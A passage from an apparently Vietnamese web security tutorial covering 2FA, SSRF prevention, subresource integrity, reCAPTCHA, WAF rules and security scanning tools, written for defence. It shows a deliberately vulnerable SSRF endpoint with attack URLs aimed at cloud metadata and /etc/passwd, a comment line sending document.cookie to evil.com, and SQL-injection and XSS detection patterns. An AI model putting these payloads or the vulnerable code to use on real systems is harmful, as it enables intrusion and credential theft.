    return res.status(401).json({ error: 'Backup code không hợp lệ' });
  }

  // ✅ Remove used backup code
  await db.users.update(user.id, {
    backupCodes: user.backupCodes.filter(
      (hashedCode) => !bcrypt.compareSync(backupCode, hashedCode)
    ),
  });

  // Generate tokens...
  res.json({ accessToken, message: 'Login thành công với backup code' });
});

// 🔐 E. Frontend Implementation
function TwoFactorSetup() {
  const [qrCode, setQrCode] = useState('');
  const [secret, setSecret] = useState('');
  const [verificationCode, setVerificationCode] = useState('');
  const [backupCodes, setBackupCodes] = useState<string[]>([]);
  const [step, setStep] = useState<'enable' | 'verify' | 'complete'>('enable');

  const handleEnable2FA = async () => {
    const res = await fetch('/api/2fa/enable', {
      method: 'POST',
      headers: { Authorization: `Bearer ${accessToken}` },
    });

    const data = await res.json();
    setQrCode(data.qrCode);
    setSecret(data.secret);
    setStep('verify');
  };

  const handleVerify = async () => {
    const res = await fetch('/api/2fa/verify', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ code: verificationCode }),
    });

    const data = await res.json();
    if (data.success) {
      setBackupCodes(data.backupCodes);
      setStep('complete');
    }
  };

  return (
    <div>
      {step === 'enable' && (
        <button onClick={handleEnable2FA}>Kích hoạt 2FA</button>
      )}

      {step === 'verify' && (
        <div>
          <h3>Scan QR Code với Google Authenticator</h3>
          <img src={qrCode} alt="QR Code" />
          <p>Hoặc nhập manual: {secret}</p>

          <input
            type="text"
            placeholder="Nhập mã 6 số"
            value={verificationCode}
            onChange={(e) => setVerificationCode(e.target.value)}
          />
          <button onClick={handleVerify}>Xác nhận</button>
        </div>
      )}

      {step === 'complete' && (
        <div>
          <h3>✅ 2FA đã được kích hoạt!</h3>
          <h4>Backup Codes (lưu lại an toàn):</h4>
          <ul>
            {backupCodes.map((code) => (
              <li key={code}>{code}</li>
            ))}
          </ul>
          <p>⚠️ Mỗi backup code chỉ dùng được 1 lần</p>
        </div>
      )}
    </div>
  );
}

// Login với 2FA
function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [twoFactorCode, setTwoFactorCode] = useState('');
  const [require2FA, setRequire2FA] = useState(false);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    const res = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password, twoFactorCode }),
    });

    const data = await res.json();

    if (data.error === '2FA_REQUIRED') {
      setRequire2FA(true);
      return;
    }

    if (data.accessToken) {
      // Login thành công
      authStore.setAccessToken(data.accessToken);
      navigate('/dashboard');
    }
  };

  return (
    <form onSubmit={handleLogin}>
      <input
        type="email"
        placeholder="Email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        placeholder="Password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />

      {require2FA && (
        <input
          type="text"
          placeholder="Mã xác thực 6 số"
          value={twoFactorCode}
          onChange={(e) => setTwoFactorCode(e.target.value)}
          maxLength={6}
        />
      )}

      <button type="submit">Login</button>
    </form>
  );
}

// 📊 2FA BEST PRACTICES
/*
✅ Use TOTP (Time-based OTP) với Google Authenticator / Authy
✅ Provide backup codes (10 codes, single-use)
✅ Allow disabling 2FA (với password + backup code)
✅ Log 2FA events (enable, disable, failed attempts)
✅ Rate limit 2FA verification (5 attempts/15 minutes)
✅ Consider SMS 2FA as fallback (nhưng less secure)
✅ Support multiple 2FA devices
✅ Send email alert khi 2FA enabled/disabled
*/
```

---

### **🚫 8.4. SERVER-SIDE REQUEST FORGERY (SSRF) - Tấn Công SSRF**

**📌 Giải thích:** SSRF là khi hacker trick server gửi request đến internal resources

**Ví dụ tấn công:**

```typescript
// ❌ VULNERABLE CODE
app.get('/api/fetch-image', async (req, res) => {
  const { url } = req.query;

  // Hacker có thể:
  // /api/fetch-image?url=http://localhost:6379 (Redis)
  // /api/fetch-image?url=http://169.254.169.254/latest/meta-data (AWS metadata)
  // /api/fetch-image?url=file:///etc/passwd (Local files)

  const response = await fetch(url); // ❌ SSRF vulnerability!
  const data = await response.text();
  res.send(data);
});
```

**✅ Giải pháp:**

```typescript
// =====================================
// SSRF PREVENTION
// =====================================

import { URL } from 'url';
import dns from 'dns/promises';

// 🛡️ A. Whitelist Allowed Domains
const ALLOWED_DOMAINS = [
  'api.example.com',
  'cdn.example.com',
  's3.amazonaws.com',
];

async function isAllowedURL(urlString: string): Promise<boolean> {
  try {
    const url = new URL(urlString);

    // ✅ Check 1: Only HTTPS
    if (url.protocol !== 'https:') {
      return false;
    }

    // ✅ Check 2: Whitelist domain
    const hostname = url.hostname;
    if (!ALLOWED_DOMAINS.includes(hostname)) {
      return false;
    }

    // ✅ Check 3: Resolve DNS → check không phải internal IP
    const addresses = await dns.resolve4(hostname);

    for (const ip of addresses) {
      if (isPrivateIP(ip)) {
        console.log(
          `❌ SSRF attempt: ${hostname} resolves to private IP ${ip}`
        );
        return false;
      }
    }

    return true;
  } catch (error) {
    return false;
  }
}

// 🛡️ B. Check Private IP Ranges
function isPrivateIP(ip: string): boolean {
  const parts = ip.split('.').map(Number);

  // 10.0.0.0/8
  if (parts[0] === 10) return true;

  // 172.16.0.0/12
  if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;

  // 192.168.0.0/16
  if (parts[0] === 192 && parts[1] === 168) return true;

  // 127.0.0.0/8 (localhost)
  if (parts[0] === 127) return true;

  // 169.254.0.0/16 (link-local)
  if (parts[0] === 169 && parts[1] === 254) return true;

  // 0.0.0.0/8
  if (parts[0] === 0) return true;

  return false;
}

// 🛡️ C. Secure Fetch Implementation
app.get('/api/fetch-image', authenticateToken, async (req, res) => {
  const { url } = req.query;

  if (!url || typeof url !== 'string') {
    return res.status(400).json({ error: 'Invalid URL' });
  }

  // ✅ Validate URL
  const isAllowed = await isAllowedURL(url);
  if (!isAllowed) {
    console.log(`⚠️ SSRF attempt blocked: ${url}`);
    return res.status(403).json({ error: 'URL not allowed' });
  }

  try {
    // ✅ Fetch với timeout
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000); // 5s timeout

    const response = await fetch(url, {
      signal: controller.signal,
      // ✅ Limit redirects
      redirect: 'manual',
    });

    clearTimeout(timeout);

    // ✅ Check response size
    const contentLength = response.headers.get('content-length');
    if (contentLength && parseInt(contentLength) > 5 * 1024 * 1024) {
      return res.status(413).json({ error: 'File too large' });
    }

    // ✅ Validate content type
    const contentType = response.headers.get('content-type');
    if (!contentType?.startsWith('image/')) {
      return res.status(400).json({ error: 'Not an image' });
    }

    const buffer = await response.arrayBuffer();
    res.contentType(contentType);
    res.send(Buffer.from(buffer));
  } catch (error) {
    if (error.name === 'AbortError') {
      return res.status(408).json({ error: 'Request timeout' });
    }
    res.status(500).json({ error: 'Fetch failed' });
  }
});

// 📊 SSRF PREVENTION CHECKLIST
/*
✅ Whitelist allowed domains/IPs
✅ Block private IP ranges (10.x.x.x, 192.168.x.x, 127.0.0.1)
✅ Block AWS metadata endpoint (169.254.169.254)
✅ Resolve DNS before fetching (check IP)
✅ Only allow HTTP/HTTPS protocols
✅ Disable redirects or limit to 3 max
✅ Set request timeout (5-10 seconds)
✅ Validate response content-type
✅ Limit response size
✅ Log suspicious requests
*/
```

---

### **🔐 8.5. SUBRESOURCE INTEGRITY (SRI) - Xác Minh Tài Nguyên**

**📌 Vấn Đề:** CDN bị hack → file JavaScript bị sửa → inject malicious code

**✅ Giải pháp:** SRI = Verify file hash trước khi execute

```html
<!-- =====================================
     SUBRESOURCE INTEGRITY (SRI)
     ===================================== -->

<!-- ❌ KHÔNG AN TOÀN: Không có integrity check -->
<script src="https://cdn.example.com/library.js"></script>

<!-- Nếu CDN bị hack:
     library.js → inject: fetch('https://evil.com?cookie='+document.cookie)
     → Tất cả websites dùng CDN này bị hack!
-->

<!-- ✅ AN TOÀN: Có SRI integrity check -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux"
  crossorigin="anonymous"
></script>

<!--
  integrity="sha384-..."
  - Browser tính hash của file
  - So sánh với hash trong integrity attribute
  - Nếu khác nhau → BLOCK file → script không chạy
  - Nếu CDN bị hack và file thay đổi → hash khác → blocked!
-->

<!-- ✅ Ví dụ với React từ CDN -->
<script
  src="https://unpkg.com/react@18/umd/react.production.min.js"
  integrity="sha384-cPJnyRZOYk8WjQbB6nBp9Iw0VgK6k7KkW6w3YwZ3C8nBp9Iw0VgK6k7KkW6w3YwZ"
  crossorigin="anonymous"
></script>

<!-- ✅ Multiple hashes (fallback algorithms) -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha256-abc123... sha384-def456... sha512-ghi789..."
  crossorigin="anonymous"
></script>
```

**🛠️ Generate SRI Hash:**

```bash
# Command line
cat library.js | openssl dgst -sha384 -binary | openssl base64 -A

# Output: oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux...
```

```typescript
// Node.js
import crypto from 'crypto';
import fs from 'fs';

function generateSRIHash(
  filePath: string,
  algorithm: 'sha256' | 'sha384' | 'sha512' = 'sha384'
): string {
  const fileBuffer = fs.readFileSync(filePath);
  const hash = crypto.createHash(algorithm).update(fileBuffer).digest('base64');
  return `${algorithm}-${hash}`;
}

// Usage
const sriHash = generateSRIHash('./library.js', 'sha384');
console.log(`integrity="${sriHash}"`);
// Output: integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
```

**📊 SRI Best Practices:**

```typescript
/*
✅ Always use SRI for third-party CDN files
✅ Use sha384 or sha512 (sha256 acceptable but weaker)
✅ Include crossorigin="anonymous" attribute
✅ Consider using multiple hashes for algorithm agility
✅ Update hashes when updating library versions
✅ Use tools: https://www.srihash.org/
❌ Don't use SRI for self-hosted files (unnecessary)
❌ Don't use SRI with dynamic content
*/
```

---

### **🤖 8.6. CAPTCHA IMPLEMENTATION - Chống Bot**

**📌 Use cases:**

- Login form (chống brute-force)
- Registration form (chống spam accounts)
- Contact form (chống spam messages)
- Password reset (chống account enumeration)

```typescript
// =====================================
// GOOGLE reCAPTCHA v3 IMPLEMENTATION
// =====================================

// 🤖 A. Frontend Implementation (React)
import { useEffect, useState } from 'react';

// Load reCAPTCHA script
function loadReCaptchaScript() {
  const script = document.createElement('script');
  script.src = `https://www.google.com/recaptcha/api.js?render=${RECAPTCHA_SITE_KEY}`;
  document.head.appendChild(script);
}

function LoginForm() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');

  useEffect(() => {
    loadReCaptchaScript();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      // ✅ Execute reCAPTCHA
      const token = await window.grecaptcha.execute(RECAPTCHA_SITE_KEY, {
        action: 'login' // Action name (để phân tích)
      });

      // ✅ Send token to backend
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email,
          password,
          recaptchaToken: token // ✅ Include reCAPTCHA token
        })
      });

      const data = await res.json();

      if (data.accessToken) {
        authStore.setAccessToken(data.accessToken);
        navigate('/dashboard');
      }

    } catch (error) {
      console.error('Login error:', error);
    }
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        type="email"
        placeholder="Email"
        value={email}
        onChange={(e) => setEmail(e.target.value)}
      />
      <input
        type="password"
        placeholder="Password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />
      <button type="submit">Login</button>

      {/* reCAPTCHA badge (auto-displayed) */}
    </form>
  );
}

// 🤖 B. Backend Verification
import axios from 'axios';

interface RecaptchaResponse {
  success: boolean;
  score: number; // 0.0 - 1.0 (1.0 = definitely human, 0.0 = definitely bot)
  action: string;
  challenge_ts: string;
  hostname: string;
  'error-codes'?: string[];
}

async function verifyRecaptcha(token: string, expectedAction: string): Promise<boolean> {
  try {
    // ✅ Call Google reCAPTCHA API
    const response = await axios.post<RecaptchaResponse>(
      'https://www.google.com/recaptcha/api/siteverify',
      null,
      {
        params: {
          secret: process.env.RECAPTCHA_SECRET_KEY,
          response: token
        }
      }
    );

    const data = response.data;

    // ✅ Check success
    if (!data.success) {
      console.log('❌ reCAPTCHA verification failed:', data['error-codes']);
      return false;
    }

    // ✅ Check action matches
    if (data.action !== expectedAction) {
      console.log(`❌ Action mismatch: expected ${expectedAction}, got ${data.action}`);
      return false;
    }

    // ✅ Check score (0.0 - 1.0)
    // - 1.0: Definitely human
    // - 0.5: Suspicious
    // - 0.0: Definitely bot
    const threshold = 0.5; // Adjust based on your needs

    if (data.score < threshold) {
      console.log(`⚠️ Low reCAPTCHA score: ${data.score} (threshold: ${threshold})`);
      return false;
    }

    console.log(`✅ reCAPTCHA passed: score ${data.score}`);
    return true;

  } catch (error) {
    console.error('reCAPTCHA verification error:', error);
    return false; // Fail securely
  }
}

// 🤖 C. Login with CAPTCHA Verification
app.post('/api/login', async (req, res) => {
  const { email, password, recaptchaToken } = req.body;

  // ✅ Verify reCAPTCHA
  const isHuman = await verifyRecaptcha(recaptchaToken, 'login');

  if (!isHuman) {
    return res.status(403).json({
      error: 'reCAPTCHA verification failed. Are you a bot?'
    });
  }

  // ✅ Continue with login logic
  const user = await db.users.findOne({ email });
  // ... rest of login logic
});

// 📊 reCAPTCHA v3 vs v2

/*
┌──────────────────┬────────────────────────────────────────────────────┐
│  reCAPTCHA v2    │  reCAPTCHA v3                                     │
├──────────────────┼────────────────────────────────────────────────────┤
│  ✅ Checkbox      │  ✅ No user interaction                            │
│  ✅ Challenge     │  ✅ Score-based (0.0 - 1.0)                        │
│  ❌ UX impact     │  ✅ Better UX (invisible)                          │
│  ✅ Clear result  │  ⚠️ Requires threshold tuning                     │
│  Use: Forms      │  Use: All interactions (login, submit, checkout)  │
└──────────────────┴────────────────────────────────────────────────────┘
*/

// 🤖 D. Alternative: hCaptcha (GDPR-compliant)
// hCaptcha tương tự reCAPTCHA nhưng privacy-focused

// Frontend
<script src="https://hcaptcha.com/1/api.js" async defer></script>
<div class="h-captcha" data-sitekey="your-site-key"></div>

// Backend
const response = await axios.post('https://hcaptcha.com/siteverify', {
  secret: process.env.HCAPTCHA_SECRET,
  response: req.body.hcaptchaToken
});
```

---

### **🛡️ 8.7. WEB APPLICATION FIREWALL (WAF) - Tường Lửa Web**

**📌 Định nghĩa:** WAF = firewall bảo vệ web app khỏi các attacks (XSS, SQL injection, DDoS)

**🔧 Implementation với Cloudflare WAF:**

```typescript
// =====================================
// CLOUDFLARE WAF SETUP
// =====================================

/*
📊 Cloudflare WAF Features:

1️⃣ Managed Rulesets
   - OWASP Core Rule Set
   - Cloudflare Managed Ruleset
   - Auto-block XSS, SQL injection, RCE

2️⃣ Rate Limiting
   - Limit requests per IP
   - Custom rules per endpoint

3️⃣ DDoS Protection
   - Layer 3/4 DDoS mitigation
   - Layer 7 (application) DDoS protection

4️⃣ Bot Management
   - Block malicious bots
   - Allow good bots (Google, Bing)

5️⃣ Custom Rules
   - Block by country
   - Block by IP
   - Custom firewall rules
*/

// ✅ A. Cloudflare Custom Rule Examples
// (Configure trong Cloudflare Dashboard → Security → WAF)

// Rule 1: Block SQL injection attempts
// (http.request.uri.query contains "' OR '1'='1" or http.request.body contains "UNION SELECT")

// Rule 2: Rate limit login endpoint
// (http.request.uri.path eq "/api/login" and rate(1m) > 5)

// Rule 3: Block by country
// (ip.geoip.country in {"CN" "RU" "KP"})

// Rule 4: Allow only specific User-Agents
// (not http.user_agent contains "Mozilla" and not http.user_agent contains "Chrome")

// ✅ B. AWS WAF Implementation
import {
  WAFv2Client,
  CreateWebACLCommand,
  CreateRuleGroupCommand,
} from '@aws-sdk/client-wafv2';

const wafClient = new WAFv2Client({ region: 'us-east-1' });

// Create WAF Web ACL
const createWAF = async () => {
  const command = new CreateWebACLCommand({
    Name: 'MyWebACL',
    Scope: 'REGIONAL', // or 'CLOUDFRONT'
    DefaultAction: { Allow: {} }, // Default allow

    Rules: [
      {
        Name: 'RateLimitRule',
        Priority: 1,
        Statement: {
          RateBasedStatement: {
            Limit: 2000, // 2000 requests per 5 minutes
            AggregateKeyType: 'IP',
          },
        },
        Action: { Block: {} },
        VisibilityConfig: {
          SampledRequestsEnabled: true,
          CloudWatchMetricsEnabled: true,
          MetricName: 'RateLimitRule',
        },
      },
      {
        Name: 'SQLInjectionRule',
        Priority: 2,
        Statement: {
          SqliMatchStatement: {
            FieldToMatch: {
              QueryString: {},
            },
            TextTransformations: [
              { Priority: 0, Type: 'URL_DECODE' },
              { Priority: 1, Type: 'HTML_ENTITY_DECODE' },
            ],
          },
        },
        Action: { Block: {} },
        VisibilityConfig: {
          SampledRequestsEnabled: true,
          CloudWatchMetricsEnabled: true,
          MetricName: 'SQLInjectionRule',
        },
      },
      {
        Name: 'XSSRule',
        Priority: 3,
        Statement: {
          XssMatchStatement: {
            FieldToMatch: {
              AllQueryArguments: {},
            },
            TextTransformations: [
              { Priority: 0, Type: 'URL_DECODE' },
              { Priority: 1, Type: 'HTML_ENTITY_DECODE' },
            ],
          },
        },
        Action: { Block: {} },
        VisibilityConfig: {
          SampledRequestsEnabled: true,
          CloudWatchMetricsEnabled: true,
          MetricName: 'XSSRule',
        },
      },
    ],

    VisibilityConfig: {
      SampledRequestsEnabled: true,
      CloudWatchMetricsEnabled: true,
      MetricName: 'MyWebACL',
    },
  });

  const response = await wafClient.send(command);
  console.log('✅ WAF Created:', response.Summary);
};

// ✅ C. Application-Level WAF (Express Middleware)
import { expressjwt } from 'express-jwt';

// WAF Middleware
const wafMiddleware = (req: Request, res: Response, next: NextFunction) => {
  const ip = req.ip;
  const url = req.url;
  const body = JSON.stringify(req.body);

  // ✅ Check 1: SQL Injection patterns
  const sqlPattern =
    /(\bOR\b|\bAND\b).*=.*|UNION|SELECT|DROP|DELETE|INSERT|UPDATE/i;
  if (sqlPattern.test(url) || sqlPattern.test(body)) {
    console.log(`⚠️ SQL Injection attempt from ${ip}: ${url}`);
    return res.status(403).json({ error: 'Forbidden' });
  }

  // ✅ Check 2: XSS patterns
  const xssPattern = /<script|javascript:|onerror=|onclick=/i;
  if (xssPattern.test(url) || xssPattern.test(body)) {
    console.log(`⚠️ XSS attempt from ${ip}`);
    return res.status(403).json({ error: 'Forbidden' });
  }

  // ✅ Check 3: Path traversal
  if (url.includes('../') || url.includes('..\\')) {
    console.log(`⚠️ Path traversal attempt from ${ip}: ${url}`);
    return res.status(403).json({ error: 'Forbidden' });
  }

  // ✅ Check 4: Blocked IPs
  const BLOCKED_IPS = ['1.2.3.4', '5.6.7.8'];
  if (BLOCKED_IPS.includes(ip)) {
    console.log(`⚠️ Blocked IP attempted access: ${ip}`);
    return res.status(403).json({ error: 'Your IP is blocked' });
  }

  next();
};

// Apply WAF middleware globally
app.use(wafMiddleware);

// 📊 WAF BEST PRACTICES
/*
✅ Use managed rule sets (OWASP Core Rule Set)
✅ Enable rate limiting per endpoint
✅ Log all blocked requests
✅ Whitelist known good IPs (office, CI/CD)
✅ Tune rules to reduce false positives
✅ Monitor WAF metrics (blocked requests, false positives)
✅ Combine with DDoS protection
✅ Use CDN + WAF (Cloudflare, AWS CloudFront)
❌ Don't rely solely on WAF (defense in depth)
❌ Don't block legitimate traffic (test thoroughly)
*/
```

---

### **🔍 8.8. SECURITY TESTING TOOLS - Công Cụ Test Bảo Mật**

```typescript
// =====================================
// SECURITY TESTING & SCANNING
// =====================================

/*
🛠️ Security Testing Tools:

1️⃣ OWASP ZAP (Zed Attack Proxy)
   - Free, open-source
   - Automated security scanning
   - Find XSS, SQL injection, CSRF
   - https://www.zaproxy.org/

2️⃣ Burp Suite
   - Industry standard
   - Manual + automated testing
   - Powerful scanner
   - https://portswigger.net/burp

3️⃣ Nmap
   - Network scanner
   - Port scanning
   - Service detection

4️⃣ Nikto
   - Web server scanner
   - Find misconfigurations
   - Check for outdated software

5️⃣ SQLMap
   - Automated SQL injection tool
   - Test database security

6️⃣ OWASP Dependency-Check
   - Scan dependencies for vulnerabilities
   - NPM audit, Snyk alternative

7️⃣ SSL Labs
   - Test TLS/SSL configuration
   - https://www.ssllabs.com/ssltest/

8️⃣ SecurityHeaders.com
   - Scan security headers
   - https://securityheaders.com/
*/

// 🔧 A. Automated Security Testing với npm audit
// package.json scripts
{
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "audit:force": "npm audit fix --force"
  }
}

// CI/CD pipeline (GitHub Actions)
// .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run npm audit
        run: npm audit --audit-level=high

      - name: Run OWASP Dependency-Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'my-project'
          path: '.'
          format: 'HTML'

      - name: Upload Results
        uses: actions/upload-artifact@v3
        with:
          name: dependency-check-report
          path: dependency-check-report.html

// 🔧 B. Snyk Integration (Vulnerability Scanning)
import snyk from 'snyk';

async function scanDependencies() {
  const results = await snyk.test('./package.json', {
    org: 'my-org',
    'package-manager': 'npm'
  });

  console.log('Vulnerabilities found:', results.vulnerabilities.length);

  results.vulnerabilities.forEach(vuln => {
    console.log(`- ${vuln.title} (${vuln.severity})`);
    console.log(`  Package: ${vuln.packageName}@${vuln.version}`);
    console.log(`  Fix: ${vuln.upgradePath.join(' → ')}`);
  });
}

// 🔧 C. OWASP ZAP Automated Scan
// zap-scan.js
const ZapClient = require('zaproxy');

async function runZAPScan(targetUrl) {
  const zaproxy = new ZapClient({
    apiKey: process.env.ZAP_API_KEY,
    proxy: 'http://localhost:8080'
  });

  console.log('🔍 Starting ZAP scan...');

  // Spider (crawl website)
  await zaproxy.spider.scan(targetUrl);

  // Active scan (attack)
  const scanId = await zaproxy.ascan.scan(targetUrl);

  // Wait for scan to complete
  let status = 0;
  while (status < 100) {
    await new Promise(resolve => setTimeout(resolve, 5000));
    status = await zaproxy.ascan.status(scanId);
    console.log(`Scan progress: ${status}%`);
  }

  // Get results
  const alerts = await zaproxy.core.alerts(targetUrl);

  console.log(`✅ Scan complete. Found ${alerts.length} issues:`);

  alerts.forEach(alert => {
    console.log(`- [${alert.risk}] ${alert.alert}`);
    console.log(`  URL: ${alert.url}`);
    console.log(`  Description: ${alert.description}`);
    console.log(`  Solution: ${alert.solution}`);
  });
}

// 🔧 D. Security Headers Check Script
async function checkSecurityHeaders(url: string) {
  const response = await fetch(url);
  const headers = response.headers;

  const securityHeaders = {
    'strict-transport-security': headers.get('strict-transport-security'),
    'content-security-policy': headers.get('content-security-policy'),
    'x-frame-options': headers.get('x-frame-options'),
    'x-content-type-options': headers.get('x-content-type-options'),
    'referrer-policy': headers.get('referrer-policy'),
    'permissions-policy': headers.get('permissions-policy')
  };

  console.log('🔐 Security Headers:');
  Object.entries(securityHeaders).forEach(([header, value]) => {
    if (value) {
      console.log(`✅ ${header}: ${value}`);
    } else {
      console.log(`❌ ${header}: MISSING`);
    }
  });
}

// Usage
checkSecurityHeaders('https://yourwebsite.com');

// 📊 SECURITY TESTING CHECKLIST
/*
✅ Run npm audit regularly (CI/CD)
✅ Use Snyk/Dependabot for dependency vulnerabilities
✅ Scan with OWASP ZAP before production deploy
✅ Test TLS/SSL configuration (SSL Labs)
✅ Verify security headers (securityheaders.com)
✅ Penetration testing (hire security experts)
✅ Bug bounty program (HackerOne, Bugcrowd)
✅ Security code review
✅ SAST (Static Analysis) tools
✅ DAST (Dynamic Analysis) tools
*/
```

---

## **🎓 TỔNG KẾT - Security Mindset**

### **🧠 Defense in Depth (Phòng Thủ Nhiều Tầng)**

```
┌────────────────────────────────────────────────────────────────┐
│                    SECURITY LAYERS                              │
├────────────────────────────────────────────────────────────────┤
│  🌐 Network Layer:    Firewall, WAF, DDoS protection           │
│  🔒 Transport Layer:  HTTPS/TLS 1.3, Certificate pinning       │
│  🔐 Application:      Input validation, Output encoding         │
│  👤 Authentication:   2FA, OAuth, JWT, Session management       │
│  🔑 Authorization:    RBAC, Least privilege                     │
│  💾 Data:             Encryption at rest, Hashing passwords     │
│  📝 Logging:          Security events, Anomaly detection        │
│  🧪 Testing:          Penetration testing, Vulnerability scans  │
└────────────────────────────────────────────────────────────────┘
```

### **✅ Security Best Practices Summary**

1. **NEVER trust user input** - Validate everything server-side
2. **Use HTTPS everywhere** - No exceptions, even for non-sensitive sites
3. **Hash passwords** - bcrypt/argon2, NEVER encrypt passwords
4. **Use HttpOnly cookies** - For refresh tokens
5. **Implement CSRF protection** - Tokens for state-changing operations
6. **Enable CSP headers** - Prevent XSS attacks
7. **Rate limit** - All APIs, especially auth endpoints
8. **Use prepared statements** - Prevent SQL injection
9. **Keep dependencies updated** - npm audit, Snyk, Dependabot
10. **Log security events** - Failed logins, XSS attempts, SQL injection
11. **Implement 2FA** - For sensitive operations
12. **Use SRI for CDN files** - Verify integrity
13. **Validate file uploads** - MIME type + magic number + virus scan
14. **Store secrets in env vars** - Never hardcode in source
15. **Principle of least privilege** - Minimal permissions
16. **Regular security audits** - Penetration testing, code reviews
17. **Educate developers** - Security training, OWASP Top 10
18. **Have incident response plan** - Know what to do when breached

### **🚨 OWASP Top 10 (2021) - Must Know**

1. **A01:2021-Broken Access Control** - IDOR, missing auth checks
2. **A02:2021-Cryptographic Failures** - Weak encryption, exposed secrets
3. **A03:2021-Injection** - SQL, NoSQL, Command injection
4. **A04:2021-Insecure Design** - Flawed architecture
5. **A05:2021-Security Misconfiguration** - Default configs, verbose errors
6. **A06:2021-Vulnerable Components** - Outdated libraries
7. **A07:2021-Identification and Authentication Failures** - Weak auth
8. **A08:2021-Software and Data Integrity Failures** - Unsigned code, supply chain
9. **A09:2021-Security Logging and Monitoring Failures** - No logs, no alerts
10. **A10:2021-Server-Side Request Forgery (SSRF)** - Unvalidated URLs

### **📚 Learning Resources**

- **OWASP Top 10**: https://owasp.org/www-project-top-ten/
- **Web Security Academy**: https://portswigger.net/web-security
- **Hack The Box**: https://www.hackthebox.eu/
- **CTF Challenges**: https://ctftime.org/
- **Security Headers**: https://securityheaders.com/
- **SSL Labs**: https://www.ssllabs.com/ssltest/

---

**🎯 Remember:**

> "Security is not a product, but a process." - Bruce Schneier

> "The only truly secure system is one that is powered off, cast in a block of concrete and sealed in a lead-lined room with armed guards." - Gene Spafford

**✅ Good security = Layers + Education + Monitoring + Testing**
